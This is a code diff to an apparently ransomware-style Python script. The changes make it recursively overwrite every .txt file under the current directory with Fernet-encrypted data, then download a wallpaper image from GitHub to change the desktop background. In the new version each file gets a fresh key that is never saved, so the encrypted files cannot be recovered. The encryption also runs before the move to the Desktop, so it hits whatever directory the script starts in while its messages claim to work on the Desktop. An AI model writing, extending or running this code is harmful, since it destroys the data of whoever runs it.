@@ -7,6 +7,27 @@ import urllib.request
 # Generate key
 key=Fernet.generate_key()
 
+# Change directory
+def change_to_desktop():
+    system = platform.system()
+
+    if system == "Windows":
+        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    elif system == "Darwin":  # macOS
+        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    elif system == "Linux":
+        # This assumes a standard GNOME desktop environment
+        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    else:
+        print("Unsupported operating system.")
+        return
+
+    try:
+        os.chdir(desktop_path)
+        print(f"Changed working directory to Desktop: {desktop_path}")
+    except FileNotFoundError:
+        print(f"Desktop directory not found: {desktop_path}")
+
 # Save key to file
 with open("key.key","wb") as f:
     f.write(key)
@@ -15,18 +36,28 @@ with open("key.key","wb") as f:
 fernet = Fernet(key)
 
 # Encrypt content of text files
-for i in os.walk(os.getcwd()):
-    # print(i[2])
-    for j in i[2]:
-        if str(j).endswith(".txt"):
-            # print(j)
-            with open(str(j),"r") as f:
-                data=f.read()
+# Function to list and encrypt text files on the Desktop
+def encrypt():
+    try:
+        for root, dirs, files in os.walk(os.getcwd()):
+            for file_name in files:
+                if file_name.endswith(".txt"):
+                    file_path = os.path.join(root, file_name)
 
-            encrypted = fernet.encrypt(data.encode())
+                    with open(file_path, "r") as f:
+                        data = f.read()
 
-            with open(str(j),"wb") as f:
-                f.write(encrypted)
+                    key = Fernet.generate_key()
+                    fernet = Fernet(key)
+                    encrypted = fernet.encrypt(data.encode())
+
+                    with open(file_path, "wb") as f:
+                        f.write(encrypted)
+
+                    print(f"Encrypted {file_name} on the Desktop.")
+    except FileNotFoundError:
+        print("Error encrypting files. Desktop directory not found.")
+
 
             # print(encrypted)
                 
@@ -55,7 +86,13 @@ def change_wallpaper(file_path):
 if __name__ == "__main__":
     wallpaper_url = "https://raw.githubusercontent.com/tompilooo/EncryptFile/main/bt.jpg"
     download_path = os.path.abspath("bt.jpg")
-    
+
+    #Encryption
+    encrypt()
+
+    # Desktop directory
+    change_to_desktop()
+
     # Download the file
     download_file(wallpaper_url, download_path)
 
